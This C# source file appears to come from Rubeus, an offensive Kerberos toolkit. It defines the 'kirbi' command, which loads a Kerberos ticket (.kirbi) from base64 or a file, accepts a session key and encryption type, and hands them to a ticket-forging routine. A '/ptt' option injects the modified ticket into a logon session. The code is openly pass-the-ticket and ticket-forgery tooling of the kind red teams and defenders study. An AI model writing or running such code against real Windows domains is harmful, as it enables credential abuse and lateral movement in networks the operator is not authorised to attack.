using System;
using System.Collections.Generic;
using System.IO;
using Rubeus.lib.Interop;

namespace Rubeus.Commands
{
    public class Kirbi : ICommand
    {
        public static string CommandName => "kirbi";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("[*] Action: Modify Kirbi\r\n");

            KRB_CRED kirbi = null;
            byte[] sessionKey = null;
            Interop.KERB_ETYPE sessionKeyEtype = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            bool ptt = false;
            string outfile = "";
            LUID luid = new LUID();

            if (arguments.ContainsKey("/outfile"))
            {
                outfile = arguments["/outfile"];
            }

            if (arguments.ContainsKey("/ptt"))
            {
                ptt = true;
            }

            if (arguments.ContainsKey("/luid"))
            {
                try
                {
                    luid = new LUID(arguments["/luid"]);
                }
                catch
                {
                    Console.WriteLine("[X] Invalid LUID format ({0})\r\n", arguments["/luid"]);
                    return;
                }
            }

            if (arguments.ContainsKey("/kirbi"))
            {
                string kirbi64 = arguments["/kirbi"];

                if (Helpers.IsBase64String(kirbi64))
                {
                    byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
                    kirbi = new KRB_CRED(kirbiBytes);
                }
                else if (File.Exists(kirbi64))
                {
                    byte[] kirbiBytes = File.ReadAllBytes(kirbi64);
                    kirbi = new KRB_CRED(kirbiBytes);
                }
                else
                {
                    Console.WriteLine("\r\n[X] /kirbi:X must either be a .kirbi file or a base64 encoded .kirbi\r\n");
                    return;
                }
            }

            if (arguments.ContainsKey("/sessionkey"))
            {
                sessionKey = Helpers.StringToByteArray(arguments["/sessionkey"]);
            }

            if (arguments.ContainsKey("/sessionetype"))
            {
                string encTypeString = arguments["/sessionetype"].ToUpper();

                if (encTypeString.Equals("RC4") || encTypeString.Equals("NTLM"))
                {
                    sessionKeyEtype = Interop.KERB_ETYPE.rc4_hmac;
                }
                else if (encTypeString.Equals("AES128"))
                {
                    sessionKeyEtype = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
                }
                else if (encTypeString.Equals("AES256") || encTypeString.Equals("AES"))
                {
                    sessionKeyEtype = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                }
                else if (encTypeString.Equals("DES"))
                {
                    sessionKeyEtype = Interop.KERB_ETYPE.des_cbc_md5;
                }
                else
                {
                    Console.WriteLine("Unsupported etype : {0}", encTypeString);
                    return;
                }
            }

            ForgeTickets.ModifyKirbi(kirbi, sessionKey, sessionKeyEtype, ptt, luid, outfile);
        }
    }
}
